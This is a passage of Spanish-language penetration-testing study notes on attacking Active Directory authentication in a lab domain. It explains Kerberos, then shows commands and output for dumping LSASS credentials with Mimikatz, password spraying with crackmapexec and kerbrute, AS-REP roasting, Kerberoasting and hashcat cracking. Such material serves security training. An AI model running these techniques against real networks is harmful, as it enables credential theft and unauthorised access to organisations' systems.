Para evitar la manipulación (tampering), el TGT se cifra con una clave secreta que solo conoce el KDC y el cliente no puede descifrar. Una vez que el cliente ha recibido la clave de sesión y el TGT, el KDC considera completa la autenticación del cliente. Por defecto, el TGT tendrá una vigencia de 10 horas, luego de lo cual se produce una renovación. Esta renovación no requiere que el usuario vuelva a ingresar la contraseña.

Cuando el usuario desea acceder a los recursos del dominio, como un network share, un buzón de correo de Exchange o alguna otra aplicación con un SPN (Service Principal Name, recordemos; una cadena que identifica a la instancia de un servicio o una aplicación en ejecución por una cuenta), debe comunicarse nuevamente con el KDC.

Esta vez, el cliente construye un *Ticket Granting Service Request* (o *TGS_REQ*) que consta del usuario actual y una marca de tiempo (cifrada con la clave de sesión), el SPN del recurso y el TGT cifrado.

Luego, el ticket granting service en el KDC recibe el TGS_REQ, y si el SPN existe en el dominio, el TGT se descifra usando la clave secreta que solo conoce el KDC. Luego, la clave de sesión se extrae del TGT y se usa para descifrar el nombre de usuario y la marca de tiempo de la solicitud. En este punto, el KDC realiza varias comprobaciones:

1. El TGT debe tener una marca de tiempo válida (no se detectó ninguna reproducción y la solicitud no ha caducado).
2. El nombre de usuario de TGS_REQ tiene que coincidir con el nombre de usuario de TGT.
3. La dirección IP del cliente debe coincidir con la dirección IP de TGT.

Si este proceso de verificación tiene éxito, el servicio de concesión de tickets responde al cliente con una *Ticket Granting Server Reply* or *TGS_REP*. Este paquete contiene tres partes:

1. El SPN al que se ha concedido acceso.
2. Una clave de sesión que se utilizará entre el cliente y el SPN.
3. Un *Service Ticket* que contiene el nombre de usuario y las pertenencias a grupos junto con la clave de sesión recién creada.

Las dos primeras partes (SPN y clave de sesión) se cifran utilizando la clave de sesión asociada a la creación del TGT y el *service ticket* se cifra utilizando el hash de la contraseña de la cuenta de servicio registrada con el SPN en cuestión.

Una vez que se completa el proceso de autenticación por parte del KDC y el cliente tiene una clave de sesión y un Service Ticket, comienza la autenticación del servicio.

Primero, el cliente envía al servidor de aplicaciones una *application request* o AP_REQ, que incluye el nombre de usuario y una marca de tiempo cifrada con la clave de sesión asociada con el ticket de servicio junto con el propio ticket de servicio.

El servidor de aplicaciones descifra el ticket de servicio utilizando el hash de la contraseña de la cuenta de servicio y extrae el nombre de usuario y la clave de sesión. Luego usa este último para descifrar el nombre de usuario del *AP_REQ*. Si el nombre de usuario *AP_REQ* coincide con el descifrado del ticket de servicio, se acepta la solicitud. Antes de que se conceda el acceso, el servicio inspecciona las pertenencias a grupos proporcionadas en el ticket de servicio y asigna los permisos apropiados al usuario, después de lo cual el usuario puede acceder al servicio solicitado.

Este protocolo puede parecer complicado e incluso enrevesado, pero fue diseñado para mitigar varios ataques a la red y evitar el uso de credenciales falsas.

Ahora que hemos explorado los fundamentos de la autenticación NTLM y Kerberos, exploremos varios ataques de cuenta de servicio y almacenamiento de credenciales en caché.

<br />

#### 5.3. Cached Credential Storage and Retrieval.

Antes de proceder a comentar como recuperar credenciales almacenadas en cache, discutamos acerca de cómo los hashes de contraseña utilizados por Kerberos se almacenan en el sistema.

Sabemos que Kerberos es un protocolo de autenticación basado en la creación de ticktes de acceso para usuarios autenticados a través de sus hashes de contraseña. A su vez, Windows es un sistema operativo en el que sólo hace falta logearse una vez para acceder a un equipo o a un dominio. Ambos puntos nos llevan a inferir que, para que los TGT se renueven cada equis tiempo, los hashes de contraseña de un usuario logeado en el sistema deben almacenarse en algún lugar del equipo. Estos hashes se almacenan en el espacio de memoria asociado al LSASS (Local Security Authority Subsystem Service). Recuperar estos hashes es el objetivo de nuestro ataque.

Esto no es tan simple como parece, LSASS se ejecuta en un contexto de alta seguridad (SYSTEM) y por tanto, necesitamos elevar nuestros privilegios antes de poder ganar acceso a estos hashes. Además, las estructuras que almacenan los hashes no están publicamente documentadas y están cifradas con una clave especifica (LSASS-stored key). Aunque algunas herramientas cuentan con procedimientos estándard que pueden sernos útiles en algunos casos, como Mimikatz.

<br />

**Mimikatz**

Mimikatz es una herramienta de escalación de privilegios. En esta sección aprenderemos con ella a:

- Extract Windows NTLM hashes.
- Extract TGT from Kerberos.

Suponiendo que tenemos acceso a una shell con permisos de administrador (que no con un usuario dentro del grupo de administradores, sino con permisos del usuario Administrador):

```
PS C:\Windows\system32> cd C:\Tools

PS C:\Tools\> .\mimikatz.exe
...

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 4876838 (00000000:004a6a26)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 12:32:11 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105
        msv :
         [00000003] Primary
         * Username : jeff
         * Domain   : CORP
         * NTLM     : 2688c6d2af5e9c7ddb268899123744ea <---
         * SHA1     : f57d987a25f39a2887d158e8d5ac41bc8971352f <---
         * DPAPI    : 3a847021d5488a148c265e6d27a420e6
        tspkg :
        wdigest :
         * Username : jeff
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
...
Authentication Id : 0 ; 122474 (00000000:0001de6a)
Session           : Service from 0
User Name         : dave
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/9/2022 1:32:23 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1103
        msv :
         [00000003] Primary
         * Username : dave
         * Domain   : CORP
         * NTLM     : 08d7a47a6f9f66b97b1bae4178747494 <---
         * SHA1     : a0c2285bfad20cc614e2d361d6246579843557cd <---
         * DPAPI    : fed8536adc54ad3d6d9076cbc6dd171d
        tspkg :
        wdigest :
         * Username : dave
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : dave
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :
```

Podemos observar que hemos obtenido los hashes SHA-1 y NTLM de dos usuarios. Podemos intentar aplicar con estos todo lo visto en la sección *Password Attacks* 

<br />

Otra posible aproximación consiste en obtener con Mimikatz los tickets TGT de Kerberos de nuestro usuario y de los de otros también almacenados en LSASS.

Sabemos que Kerberos concede a un usuario que se logea un TGT que describe su contexto de seguridad y admite su acceso a otros recursos del dominio de forma que, cuando este se utiliza queda almacenado en cache en el LSASS.

Abramos una segunda ventana de PowerShell y enumeremos el contenido del recurso compartido SMB en WEB04 con la ruta UNC **\\web04.corp.com\backup** . Esto creará y almacenará en caché un ticket de servicio.

```
PS C:\Users\jeff> dir \\web04.corp.com\backup


    Directory: \\web04.corp.com\backup


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/13/2022   2:52 AM              0 backup_schemata.txt
```

Una vez que hayamos ejecutado la lista de directorios en el recurso compartido SMB, podemos usar Mimikatz para mostrar los boletos que están almacenados en la memoria ingresando **sekurlsa::tickets** .

```
mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 656588 (00000000:000a04cc)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/13/2022 2:43:31 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105

         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             38dba17553c8a894c79042fe7265a00e36e7370b99505b8da326ff9b12aaf9c7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
         [00000001]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
...
```

La salida muestra un TGT y un TGS. Robar un TGS nos permitiría acceder solo a recursos particulares asociados con esos boletos. Alternativamente, armados con un TGT, podríamos solicitar un TGS para recursos específicos a los que queremos apuntar dentro del dominio. Discutiremos cómo aprovechar los tickets robados o falsificados más adelante en este y el próximo módulo.

**Lo importante acerca de esta sección es; cuando un usuario se logea sus credenciales quedan almacenadas en el cache hasta que se renuevan transcurrido cierto tiempo. Podemos emplear la herramienta para visualizar y hacernos con estas credenciales para robar contextos de seguridad de otros usuarios.**

<br />
### 6. Performing Attacks on Active Directory Authentication.

#### 6.1. Password Attacks.

**BruteForce warning in AD**

En esta sección, exploraremos varios Password Attacks de AD.

Antes de explorar estos ataques, debemos tener en cuenta una consideración importante. Al realizar un ataque de autenticación de fuerza bruta o lista de palabras, debemos tener en cuenta los bloqueos de cuentas. Demasiados inicios de sesión fallidos pueden bloquear la cuenta para futuros ataques y posiblemente alertar a los administradores del sistema.

Para obtener más información sobre los bloqueos de cuentas, revisemos la política de cuentas del dominio como usuario de dominio _jeff_ en CLIENT75. Podemos conectarnos al sistema con la contraseña _HenchmanPutridBonbon11_ vía RDP. A continuación, abriremos una ventana normal de PowerShell y ejecutaremos **net accounts** para obtener la política de la cuenta.

```
PS C:\Users\jeff> net accounts
Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          42
Minimum password length:                              7
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        WORKSTATION
The command completed successfully.
```

Hay mucha información disponible, pero centrémonos primero en el *Lockout Threshold*, que indica un límite de cinco intentos de inicio de sesión antes del bloqueo. Esto significa que podemos intentar con seguridad cuatro inicios de sesión antes de activar un bloqueo. Aunque esto no parezcan muchos, también debemos considerar la *Lockout observation window* , que indica que transcurridos treinta minutos desde el último inicio de sesión fallido, podemos realizar intentos adicionales.

Con esta configuración, podríamos intentar 192 inicios de sesión en un período de 24 horas contra cada usuario del dominio sin activar un bloqueo, suponiendo que los usuarios reales no fallen en un intento de inicio de sesión.

Un ataque como este podría consistir en compilar una lista corta de contraseñas muy comunes y aprovecharla contra una gran cantidad de usuarios. Esto es lo que se conoce como *Password Spraying* y a veces, este tipo de ataque puede revelar bastantes contraseñas de cuentas débiles en la organización.

Sin embargo, esto también generaría una gran cantidad de tráfico de red. Revisemos tres tipos de password spraying que tienen una mayor probabilidad de éxito en un entorno de AD.

<br />

**First Method**

El primero consiste en utilizar LDAP y ADSI (herramientas que ya hemos utilizado anteriormente en la construcción de nuestro script de enumeración) para realizar una request como otro usuario testeando así unas credenciales. Ya hemos probado a realizar estas queries con anterioridad sin argumentos, pero podemos proporcionar el nombre de usuario, el domain controller y el password

```
PS C:\Users\jeff> $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
  
PS C:\Users\jeff> $PDC = ($domainObj.PdcRoleOwner).Name

PS C:\Users\jeff> $SearchString = "LDAP://"

PS C:\Users\jeff> $SearchString += $PDC + "/"

PS C:\Users\jeff> $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

PS C:\Users\jeff> $SearchString += $DistinguishedName

PS C:\Users\jeff> New-Object System.DirectoryServices.DirectoryEntry($SearchString, "pete", "Nexus123!")
```

Si las credenciales anteriores son correctas, el script mostrará el siguiente output

```
distinguishedName : {DC=corp,DC=com}
Path              : LDAP://DC1.corp.com/DC=corp,DC=com
```

Si la contraseña no es válida, no se creará ningún objeto y recibiremos una excepción, como se muestra en el Listado 9. Para abordar esto, cambiemos la contraseña en el constructor a **WrongPassword** . Notaremos la clara advertencia de que el nombre de usuario o la contraseña son incorrectos.

```
format-default : The following exception occurred while retrieving member "distinguishedName": "The user name or
password is incorrect.
"
    + CategoryInfo          : NotSpecified: (:) [format-default], ExtendedTypeSystemException
    + FullyQualifiedErrorId : CatchFromBaseGetMember,Microsoft.PowerShell.Commands.FormatDefaultCommand
```

Podríamos implementar el mecanismo anterior dentro de un script que probara con múltiples credenciales dentro de los marcos de bloqueo del sistema enumerados con *Net accounts* y obtener así credenciales validas:

```
PS C:\Users\jeff> cd C:\Tools

PS C:\Tools> powershell -ep bypass
...

PS C:\Tools> .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
WARNING: also targeting admin accounts.
Performing brute force - press [q] to stop the process and print results...
Guessed password for user: 'pete' = 'Nexus123!'
Guessed password for user: 'jen' = 'Nexus123!'
Users guessed are:
 'pete' with password: 'Nexus123!'
 'jen' with password: 'Nexus123!'
```

De esta forma, el script .\\Spray-Passwords.ps1 realiza una enumeración de usuarios en el dominio y a través de una contraseña especificada localiza credenciales válidas o cuentas de administradores locales.

<br />

**Second Method**

El segundo tipo de password spraying attack se aprovecha de SMB.  Inteantamos realizar una conexión contra un servicio que utilice una autenticación SMB. Si la conexión se realiza satisfactoriamente, las credenciales se dan por válidas.

Podemos además agilizar el proceso empleando una herramienta de password spraying como **crackmapexec**.

```
kali@kali:~$ cat users.txt
dave
jen
pete

kali@kali:~$ crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (mvdomain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.50.75   445    CLIENT75         [-] corp.com\dave:Nexus123! STATUS_LOGON_FAILURE 
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\jen:Nexus123!
SMB         192.168.50.75   445    CLIENT75         [+] corp.com\pete:Nexus123!
```

Debemos tener en cuenta que crackmapexec no examina la política de contraseñas del dominio antes de iniciar el rociado de contraseñas. Como resultado, debemos tener cuidado al bloquear cuentas de usuario con este método.

Sin embargo, como beneficio adicional, la salida de crackmapexec no solo muestra si las credenciales son válidas, sino también si el usuario con las credenciales identificadas tiene privilegios administrativos en el sistema de destino.

```
kali@kali:~$ for i in $(seq 69 77); do crackmapexec smb 192.168.200.$i -u pete -p 'Nexus123!' -d corp.com;done
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Initializing FTP protocol database
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing RDP protocol database
[*] Initializing MSSQL protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         192.168.200.70  445    DC1              [*] Windows 10.0 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
SMB         192.168.200.70  445    DC1              [+] corp.com\pete:Nexus123! 
SMB         192.168.200.72  445    WEB04            [*] Windows 10.0 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.200.72  445    WEB04            [+] corp.com\pete:Nexus123! 
SMB         192.168.200.73  445    FILES04          [*] Windows 10.0 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.200.73  445    FILES04          [+] corp.com\pete:Nexus123! 
SMB         192.168.200.74  445    CLIENT74         [*] Windows 10.0 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.200.74  445    CLIENT74         [+] corp.com\pete:Nexus123! 
SMB         192.168.200.75  445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.200.75  445    CLIENT75         [+] corp.com\pete:Nexus123! 
SMB         192.168.200.76  445    CLIENT76         [*] Windows 10.0 Build 16299 x64 (name:CLIENT76) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.200.76  445    CLIENT76         [+] corp.com\pete:Nexus123! (Pwn3d!)

```

Además, observemos que en la prueba anterior, crackmapexec agregó _Pwn3d!_ a la salida, lo que indica que _dave_ tiene privilegios administrativos en el sistema de destino. En una evaluación, esta es una característica excelente para determinar el nivel de acceso que tenemos sin realizar una enumeración adicional.

<br />

**Third Method**

El tercer tipo de ataque se basa en obtener un TGT utilizando unas credenciales con *kinit* o *kerbrute*.

```
PS C:\Tools> type .\usernames.txt
pete
dave
jen

PS C:\Tools> .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 09/06/22 - Ronnie Flathers @ropnop

2022/09/06 20:30:48 >  Using KDC(s):
2022/09/06 20:30:48 >   dc1.corp.com:88
2022/09/06 20:30:48 >  [+] VALID LOGIN:  jen@corp.com:Nexus123!
2022/09/06 20:30:48 >  [+] VALID LOGIN:  pete@corp.com:Nexus123!
2022/09/06 20:30:48 >  Done! Tested 3 logins (2 successes) in 0.041 seconds
```

Proporcionamos una lista de usuarios, una de contraseñas y lanzamos la herramienta.

Vale la penca mencionar que mientras *kinit* es de Linux, *kerbrute* es multiplataforma.

<br />

#### 6.2. AS-REP Roasting.

**Concepto**

Como hemos comentado, el primer paso del proceso de autenticación a través de Kerberos es enviar un AS-REQ. Según esta solicitud, el controlador de dominio puede validar si la autenticación es exitosa. Si es así, el controlador de dominio responde con un AS-REP que contiene la clave de sesión y el TGT. Este paso se conoce como *Kerberos preauthentication*.

Notemos que sin este paso, un usuario ya logeado o una entidad con credenciales válidas podría solicitar TGT con contextos de otros usuarios y así, acceder a un recurso como otro usuarios y se trata de una opción habilitada por defecto en AD.

De forma predeterminada, la opción de cuenta de usuario de AD _Do not require Kerberos preauthentication_ está deshabilitada, lo que significa que la autenticación previa de Kerberos se realiza para todos los usuarios. Sin embargo, es posible habilitar esta opción de cuenta manualmente. En las evaluaciones, podemos encontrar cuentas con esta opción habilitada ya que algunas aplicaciones y tecnologías lo requieren para funcionar correctamente.

**De esta forma, si tenemos credenciales validas, podemos checkear qué usuarios contienen esta opción habilitada y solicitar mediante un AS-REQ un AS-REP obteniendo así el hash del usuario implícito en el mismo**. 

<br />

**Enumeración de usuarios válidos y extración del hash.**

Esto lo podemos enumerar con *impacket-GetNPUsers*.

Tendremos que ingresar la dirección IP del DC como argumento para **-dc-ip** , el nombre del archivo de salida en el que se almacenará el hash AS-REP en formato Hashcat para **-outputfile** y **-request** to request la TGT.

Finalmente, necesitamos especificar la información de autenticación de destino en el formato **dominio/usuario** . Este es el usuario que usamos para la autenticación. Para este ejemplo, usaremos _pete_ con la contraseña _Nexus123._ de la sección anterior. El comando completo se muestra a continuación:

```
kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
----  --------  --------------------------  --------------------------  --------
dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200 
```

Aquí se muestra que el usuario Dave tiene la opción _Do not require Kerberos preauthentication_ habilitada, con lo que podemos hacernos con su AS-REP y por tanto con su hash de contraseña que ha quedado almacenado en 'hashes.asreproast'.

Así, con Hascat primero identificamos el número asociado al hash, que es Kerberos AS-REP:

```
kali@kali:~$ hashcat --help | grep -i "Kerberos"
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```

Y crakear con la password file adecuada:

```
kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b03ec750cf33a2c37abde02f28b7ab363ffa1d18c9dd0262e43ab6a5447db44f71256120f94c24b17b1df465beed362fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd8658b144186042faaa676931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc22:Flowers1
...
```

<br />

**AS-REP in Windows**

Podemos aplicar la misma estrategia con el binario Rubeus.exe en un host Windows con un usuario autenticado.

Dado que estamos realizando este ataque como un usuario de dominio previamente autenticado, no tenemos que proporcionar ninguna otra opción a Rubeus excepto **asreproast** . Rubeus identificará automáticamente las cuentas de usuario vulnerables. También agregamos la bandera **/nowrap** para evitar que se agreguen nuevas líneas a los hashes AS-REP resultantes.

```
PS C:\Users\jeff> cd C:\Tools

PS C:\Tools> .\Rubeus.exe asreproast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: AS-REP roasting

[*] Target Domain          : corp.com

[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
[*] SamAccountName         : dave
[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
[*] Using domain controller: DC1.corp.com (192.168.50.70)
[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
```

Y de nuevo, procederíamos a transportar el AS-REP a nuestra kali para crakearlo con Hashcat

<br />

#### 6.3. Kerberoasting.

**Descripción del concepto.**

Volvamos sobre cómo funciona Kerberos. 

Cuando un usuario autenticado (con su correspondiente TGT) quiere pedir acceso a un recurso hosteado por un SPN (esto es, que el recurso se encuentra administrado por la instancia de alguna aplicación o servicio en ejecución) primero solicita al DC un *service ticket* que luego entrega al servidor de la aplicación que lo descifra sirviéndose del hash de contraseña de la cuenta de usuario poseedora del SPN y lo valida.

De esta forma, a modo de paso intermedio, podemos solicitar un *service ticket* y en lugar de entregarlo, realizar un brute force sobre el mismo para intentar obtener la contraseña en texto claro de la cuenta que ejecuta el SPN. Este método es conocido como Kerberoasting. Las cuentas que poseen un SPN vulnerables al Kerberoasting se denominan *Kerberoastables* y pueden llegar a ser identificables a través de BloodHound.

Observemos además que se trata de la aplicación quién decide si un usuario puede acceder al recurso o no. De forma que, cuando se solicita este *service ticket*, no se realiza ninguna confirmación ni checkeo de quién está solicitando el recurso, esto sólo se realiza cuando se conecta al servicio directamente sin estar logeado.

<br />

**Kerberoasting on Windows**

Para realizar Kerberoasting, usaremos Rubeus nuevamente. Especificamos el comando **kerberoast** para lanzar esta técnica de ataque. Además, proporcionaremos **hashes.kerberoast** como argumento para que **/outfile** almacene el hash TGS-REP resultante. Dado que ejecutaremos Rubeus como un usuario de dominio autenticado, la herramienta identificará todos los SPN vinculados con un usuario de dominio.

```
PS C:\Tools> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : corp.com
[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : iis_service
[*] DistinguishedName      : CN=iis_service,CN=Users,DC=corp,DC=com
[*] ServicePrincipalName   : HTTP/web04.corp.com:80
[*] PwdLastSet             : 9/7/2022 5:38:43 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash written to C:\Tools\hashes.kerberoast
```

Ahora, copiemos **hashes.kerberoast** a nuestra máquina Kali. Luego podemos revisar la ayuda de Hashcat para conocer el modo correcto para descifrar un hash TGS-REP.

```
kali@kali:~$ cat hashes.kerberoast
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
...

kali@kali:~$ hashcat --help | grep -i "Kerberos"         
  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
```

Como en la sección anterior, iniciaremos Hashcat con los argumentos **13100** como modo, **rockyou.txt** como lista de palabras, **best64.rule** como archivo de reglas y **--force** mientras realizamos el cracking en una VM.

```
kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...

$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940ad9dcf5dd5cd8e91a86d4ba0396db$f57066a4f4f8ff5d70df39b0c98ed7948a5db08d689b92446e600b49fd502dea39a8ed3b0b766e5cd40410464263557bc0e4025bfb92d89ba5c12c26c72232905dec4d060d3c8988945419ab4a7e7adec407d22bf6871d
...
d8a2033fc64622eaef566f4740659d2e520b17bd383a47da74b54048397a4aaf06093b95322ddb81ce63694e0d1a8fa974f4df071c461b65cbb3dbcaec65478798bc909bc94:Strawberry1
...
```

<br />

**Kerberoasting in Linux with Impacket-GetUserSPNs**

A continuación, realicemos Kerberoasting desde Linux. Podemos usar _impacket-GetUserSPNs_ [2](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/attacking-active-directory-authentication/performing-attacks-on-active-directory-authentication/kerberoasting#fn2) con la IP del controlador de dominio como argumento para **-dc-ip** . Dado que nuestra máquina Kali no está unida al dominio, también debemos proporcionar las credenciales de usuario del dominio para obtener el hash TGS-REP. Como antes, podemos usar **-request** para obtener los TGS y generarlos en un formato compatible con Hashcat.

```
kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete                                      
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
ServicePrincipalName    Name         MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  -----------  --------  --------------------------  ---------  ----------
HTTP/web04.corp.com:80  iis_service            2022-09-07 08:38:43.411468  <never>               


[-] CCache file is not found. Skipping...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$21b427f7d7befca7abfe9fa79ce4de60$ac1459588a99d36fb31cee7aefb03cd740e9cc6d9816806cc1ea44b147384afb551723719a6d3b960adf6b2ce4e2741f7d0ec27a87c4c8bb4e5b1bb455714d3dd52c16a4e4c242df94897994ec0087cf5cfb16c2cb64439d514241eec...
```

